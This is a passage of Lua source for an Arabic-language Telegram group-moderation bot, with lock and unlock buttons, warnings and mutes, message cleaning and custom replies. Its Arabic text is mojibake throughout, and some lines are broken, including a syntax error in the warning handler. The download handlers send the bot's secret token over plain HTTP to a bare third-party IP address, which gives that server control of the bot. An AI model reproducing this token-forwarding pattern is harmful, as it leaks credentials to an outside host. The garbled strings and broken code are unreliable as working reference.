keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockvoise') and Admin(data) then
if tonumber(Text:match('(.*)/unlockvoise')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ '
database:del(bot_id.."Lock:Audio"..Chat_id) 
database:del(bot_id.."Lock:Audio"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockaudo') and Admin(data) then
if tonumber(Text:match('(.*)/unlockaudo')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ '
database:del(bot_id.."Lock:vico"..Chat_id) 
database:del(bot_id.."Lock:vico"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockfwd') and Admin(data) then
if tonumber(Text:match('(.*)/unlockfwd')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ '
database:del(bot_id.."Lock:forward"..Chat_id) 
database:del(bot_id.."Lock:forward"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockfile') and Admin(data) then
if tonumber(Text:match('(.*)/unlockfile')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ '
database:del(bot_id.."Lock:Document"..Chat_id) 
database:del(bot_id.."Lock:Document"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockphone') and Admin(data) then
if tonumber(Text:match('(.*)/unlockphone')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ '
database:del(bot_id.."Lock:Contact"..Chat_id) 
database:del(bot_id.."Lock:Contact"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockposts') and Admin(data) then
if tonumber(Text:match('(.*)/unlockposts')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄ '
database:del(bot_id.."Lock:Spam"..Chat_id) 
database:del(bot_id.."Lock:Spam"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockflood') and Admin(data) then
if tonumber(Text:match('(.*)/unlockflood')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ± '
database:hdel(bot_id.."flooding:settings:"..Chat_id ,"flood") 
database:hdel(bot_id.."flooding:settings:"..tthh ,"flood") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockfarse') and Admin(data) then
if tonumber(Text:match('(.*)/unlockfarse')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ '
database:del(bot_id..'lock:Fars'..Chat_id) 
database:del(bot_id..'lock:Fars'..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockfshar') and Admin(data) then
if tonumber(Text:match('(.*)/unlockfshar')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ³Ψ¨ '
database:del(bot_id..'lock:Fshar'..Chat_id) 
database:del(bot_id..'lock:Fshar'..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockinlene') and Admin(data) then
if tonumber(Text:match('(.*)/unlockinlene')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ '
database:del(bot_id.."Lock:Inlen"..Chat_id) 
database:del(bot_id.."Lock:Inlen"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/homelocks') and Admin(data) then
if tonumber(Text:match('(.*)/homelocks')) == tonumber(data.sender_user_id_) then
local Texti = 'ΨͺΨ³ΨͺΨ·ΩΨΉ ΩΩΩ ΩΩΨͺΨ­ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=data.sender_user_id_.."/lockjoine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=data.sender_user_id_.."/unlockjoine"},{text = 'ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/lockinlene"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/unlockinlene"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=data.sender_user_id_.."/lock_joine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=data.sender_user_id_.."/unlock_joine"},{text = 'ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=data.sender_user_id_.."/lockbots"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlockbots"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=data.sender_user_id_.."/locktags"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=data.sender_user_id_.."/unlocktags"},{text = 'ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=data.sender_user_id_.."/lockedit"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=data.sender_user_id_.."/unlockedit"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/lockusername"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlockusername"},{text = 'ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=data.sender_user_id_.."/locklink"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=data.sender_user_id_.."/unlocklink"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΨ§Ω', callback_data=data.sender_user_id_.."/locktag"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω', callback_data=data.sender_user_id_.."/unlocktag"},{text = 'ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/locksticar"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlocksticar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ', callback_data=data.sender_user_id_.."/lockvideo"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ', callback_data=data.sender_user_id_.."/unlockvideo"},{text = 'ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=data.sender_user_id_.."/lockgif"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=data.sender_user_id_.."/unlockgif"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨ±', callback_data=data.sender_user_id_.."/lockphoto"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±', callback_data=data.sender_user_id_.."/unlockphoto"},{text = 'ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=data.sender_user_id_.."/lockvoise"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=data.sender_user_id_.."/unlockvoise"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨͺ', callback_data=data.sender_user_id_.."/lockaudo"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ', callback_data=data.sender_user_id_.."/unlockaudo"},{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=data.sender_user_id_.."/lockfwd"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=data.sender_user_id_.."/unlockfwd"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/lockfile"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlockfile"},{text = 'ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/lockphone"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlockphone"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=data.sender_user_id_.."/lockposts"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=data.sender_user_id_.."/unlockposts"},{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=data.sender_user_id_.."/lockflood"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=data.sender_user_id_.."/unlockflood"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=data.sender_user_id_.."/lockfarse"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=data.sender_user_id_.."/unlockfarse"},{text = 'ΩΩΩ Ψ§ΩΨ³Ψ¨', callback_data=data.sender_user_id_.."/lockfshar"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ³Ψ¨', callback_data=data.sender_user_id_.."/unlockfshar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=data.sender_user_id_.."/lockchat"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=data.sender_user_id_.."/unlockchat"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Texti)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
vardump(data)
if Text and Text:match('@id/(.*)') then
local Id_Link = Text:match('@id/(.*)') 
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
DeleteMessage(Chat_id,{[0] = Msg_id})  
local textt = '- ΩΩ ΩΨΆΩΩ Ψ§Ψ?ΨͺΨ± ΩΩΨΉ Ψ§ΩΨͺΩΨ²ΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΩΨ²ΩΩ Ψ΅ΩΨͺ', callback_data="mp3/"..Id_Link},
},
{
{text = 'ΨͺΩΨ²ΩΩ Ψ¨Ψ΅ΩΩ', callback_data="ogg/"..Id_Link},
},
{
{text = 'ΨͺΩΨ²ΩΩ ΩΩΨ―ΩΩ', callback_data="mp4/"..Id_Link},
},
{
{text = 'Ψ§ΨΆΩ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ¬ΩΩΨΉΨͺΩ', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..Chat_id..'&photo='..'https://youtu.be/'..Id_Link..'&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
elseif Text and Text:match('mp3/(.*)') then
local Id_Link = Text:match('mp3/(.*)') 
DeleteMessage(Chat_id,{[0] = Msg_id})    
http.request('http://78.141.220.60/Pascar.php?url='..Id_Link..'&token='..token..'&chat='..data.chat_id_..'&type=mp3&msg=0')
elseif Text and Text:match('mp/(.*)') then
local Id_Link = Text:match('mp/(.*)') 
DeleteMessage(Chat_id,{[0] = Msg_id})    
http.request('http://78.141.220.60/Pascar.php?url='..Id_Link..'&token='..token..'&chat='..data.chat_id_..'&type=mp3&msg=0')
elseif Text and Text:match('ogg/(.*)') then
local Id_Link = Text:match('ogg/(.*)') 
DeleteMessage(Chat_id,{[0] = Msg_id})    
http.request('http://78.141.220.60/Pascar.php?url='..Id_Link..'&token='..token..'&chat='..data.chat_id_..'&type=ogg&msg=0')
elseif Text and Text:match('mp4/(.*)') then
local Id_Link = Text:match('mp4/(.*)') 
DeleteMessage(Chat_id,{[0] = Msg_id})    
http.request('http://78.141.220.60/Pascar.php?url='..Id_Link..'&token='..token..'&chat='..data.chat_id_..'&type=mp4&msg=0')
end      

end
if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_) 
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
local text = msg.content_.text_
if msg.sender_user_id_ == tonumber(bot_id) then return false end

if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("OLD MESSAGE")
return false
end
if text and text:match("^Ψ§ΩΨ°Ψ§Ψ± @(.*)$") and Admin(msg) and not database:get(bot_id..'Mahmoud:inthar:group'..msg.chat_id_) then
function FunctionStatus(arg, result)
if (result.id_) then
if Rank_Checking(result.id_, msg.chat_id_) == true then
return send(msg.chat_id_, msg.id_, "\nΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΩΨ°Ψ§Ψ±: "..Get_Rank(result.id_,msg.chat_id_).." ")
end
local numinthar = tonumber(database:get(bot_id.."Mahmoud:inthar"..msg.chat_id_..result.id_) or 0)
if numinthar == 0 then
database:set(bot_id.."Mahmoud:inthar"..msg.chat_id_..result.id_,'1')
Reply_Status(msg,result.id_,"reply","ΨͺΩ Ψ§ΨΉΨ·Ψ§Ψ¦Ω Ψ§ΩΨ°Ψ§Ψ± \n ΨͺΨ¨ΩΩ ΩΩ Ψ§ΩΨ°Ψ§Ψ±ΩΩ ΩΩΨͺΩ ΩΨͺΩΩ")  
elseif numinthar == 1 then
Reply_Status(msg,result.id_,"reply","ΨͺΩ Ψ§ΨΉΨ·Ψ§Ψ¦Ω Ψ§ΩΨ°Ψ§Ψ± \n ΨͺΨ¨ΩΩ ΩΩ Ψ§ΩΨ°Ψ§Ψ± Ω ΩΨͺΩ ΩΨͺΩΩ")  
database:set(bot_id.."Mahmoud:inthar"..msg.chat_id_..result.id_,'2')
elseif numinthar == 2 then
Reply_Status(msg,result.id_,"reply","ΨͺΩ ΩΨͺΩΩ \n ΩΨ§ΩΩ ΨͺΨ¬Ψ§ΩΨ² Ψ­Ψ― 3 Ψ§ΩΨ°Ψ§Ψ±Ψ§Ψͺ")  
database:del(bot_id.."Mahmoud:inthar"..msg.chat_id_..result.id_)
database:sadd(bot_id.."Muted:User"..msg.chat_id_, result.id_)
end
else
send(msg.chat_id_, msg.id_,"Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ· ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^Ψ§ΩΨ°Ψ§Ψ± @(.*)$") }, FunctionStatus, nil)
end
if text == ("Ψ§ΩΨ°Ψ§Ψ±") and msg.reply_to_message_id_ and Admin(msg) and not database:get(bot_id..'Mahmoud:inthar:group'..msg.chat_id_) then 
function Function_Tshake(extra, result, success) 
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then 
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )") 
else 
local numinthar = tonumber(database:get(bot_id.."Mahmoud:inthar"..msg.chat_id_..result.id_) or 0) 
if numinthar == 0 then 
database:set(bot_id.."Mahmoud:inthar"..msg.chat_id_, result.sender_user_id_,'1') 
Reply_Status(msg,result.sender_user_id_,"reply","ΨͺΩ Ψ§ΨΉΨ·Ψ§Ψ¦Ω Ψ§ΩΨ°Ψ§Ψ± \n ΨͺΨ¨ΩΩ ΩΩ Ψ§ΩΨ°Ψ§Ψ±ΩΩ ΩΩΨͺΩ ΩΨͺΩΩ")   
elseif numinthar == 1 then 
Reply_Status(msg,result.sender_user_id_,"reply","ΨͺΩ Ψ§ΨΉΨ·Ψ§Ψ¦Ω Ψ§ΩΨ°Ψ§Ψ± \n ΨͺΨ¨ΩΩ ΩΩ Ψ§ΩΨ°Ψ§Ψ± Ω ΩΨͺΩ ΩΨͺΩΩ")   
database:set(bot_id.."Mahmoud:inthar"..msg.chat_id_, result.sender_user_id_'2') 
elseif numinthar == 2 then 
Reply_Status(msg,result.sender_user_id_,"reply","ΨͺΩ ΩΨͺΩΩ \n ΩΨ§ΩΩ ΨͺΨ¬Ψ§ΩΨ² Ψ­Ψ― 3 Ψ§ΩΨ°Ψ§Ψ±Ψ§Ψͺ")   
database:del(bot_id.."Mahmoud:inthar"..msg.chat_id_, result.sender_user_id_) 
database:sadd(bot_id.."Muted:User"..msg.chat_id_, result.sender_user_id_)
end 
end 
end 
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil) 
return false 
end

if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ°Ψ§Ψ±' and Admin(msg) then   
database:del(bot_id..'Mahmoud:inthar:group'..msg.chat_id_) 
Text = '\n ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ°Ψ§Ψ±Ψ§Ψͺ' 
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ°Ψ§Ψ±' and Admin(msg) then  
database:set(bot_id..'Mahmoud:inthar:group'..msg.chat_id_,true) 
Text = '\nΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ°Ψ§Ψ±Ψ§Ψͺ' 
send(msg.chat_id_, msg.id_,Text) 
end 

--======================================================================================================
--======================================================================================================
if Admin(msg) then 


if (msg.content_.ID == "MessagePhoto" 
or msg.content_.ID == "MessageSticker" 
or msg.content_.ID == "MessageVoice" 
or msg.content_.ID == "MessageAudio" 
or msg.content_.ID == "MessageVideo" 
or msg.content_.ID == "MessageAnimation" 
or msg.content_.ID == "MessageUnsupported") 
and database:get(bot_id.."lock_cleaner"..msg.chat_id_) then
print("Clener >>> ")
database:sadd(bot_id..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
Timerr = database:get(bot_id..':Timer_Cleaner:'..msg.chat_id_)
if Timerr then 
Timerr = tonumber(Timerr)
Timerr = 60*60*Timerr
end
database:setex(bot_id..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true) 
end
local Cleaner = database:smembers(bot_id..":IdsMsgsCleaner:"..msg.chat_id_)
for k,v in pairs(Cleaner) do
if not database:get(bot_id..":SetTimerCleaner:"..msg.chat_id_..v) then
DeleteMessage(msg.chat_id_, {[0] = v}) 
database:srem(bot_id..":IdsMsgsCleaner:"..msg.chat_id_,v)
print("MSG DELET CLEANER : "..v)
else
print("MSG List CLEANER : "..v.." : Lodding ...")
end
end
end

if text and DevSonic(msg) and database:get(bot_id.."witt:Del_All"..msg.sender_user_id_..":"..msg.chat_id_) then
 database:del(bot_id.."witt:Del_All"..msg.sender_user_id_..":"..msg.chat_id_)
 if database:hdel(bot_id..':Replay:Source:',text) == 0 then 
 send(msg.chat_id_, msg.id_, 'Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ°Ψ§ Ψ§ΩΩΩΩΩ ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― !')
 return false
 end
 send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ― Ψ§ΩΨΉΨ§Ω ')
 return false
 end

if text then
Replay = database:hget(bot_id..':Replay:Source:',text)
if Replay then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = database:get(bot_id..'messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = arg.Replay
local Text = Text:gsub('#username',(data.username_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',message_edit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_, Text)
end,{Replay=Replay})
return false
end
end


--------------------------------------------------------------------------------------------------------------
if tonumber(msg.sender_user_id_) ~= tonumber(bot_id) then 
if msg.sender_user_id_ and Ban_Groups(msg.chat_id_,msg.sender_user_id_) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
if text == "Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ" then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Get_Info(msg,msg.chat_id_,msg.sender_user_id_)
end  
end
if text == "Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
Get_Info(msg,msg.chat_id_,result.sender_user_id_)
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
------------------------------------------------------------------------
if text and text:match('^Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ @(.*)') then   
local username = text:match('Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ @(.*)')   
if tonumber(msg.reply_to_message_id_) == 0 then 
function prom_username(extra, result, success) 
if (result and result.code_ == 400 or result and result.message_ == "USERNAME_NOT_OCCUPIED") then
sendText(msg.chat_id_,"*- Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­ \n*",msg.id_/2097152/0.5,'md')
return false  end   
Get_Info(msg,msg.chat_id_,result.id_)
end  
tdcli_function ({ID = "SearchPublicChat",username_ = username},prom_username,nil) 
end 
end
if msg.date_ and msg.date_ < tonumber(os.time() - 15) then
print('OLD MESSAGE')
return false
end
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_Groups(msg.chat_id_,msg.content_.members_[0].id_) then 
Kick_Group(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Ban_All_Groups(msg.sender_user_id_) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
----------------------
if msg.sender_user_id_ and Gmute_User(msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_All_Groups(msg.content_.members_[0].id_) then 
Kick_Group(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
end 
end
------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == "MessagePinMessage" or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatChangeTitle" or msg.content_.ID == "MessageChatDeleteMember" then 
if database:get(bot_id.."Lock:tagservr"..msg.chat_id_) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end 
end 
if text and not database:sismember(bot_id..'Spam:Group'..msg.sender_user_id_,text) then
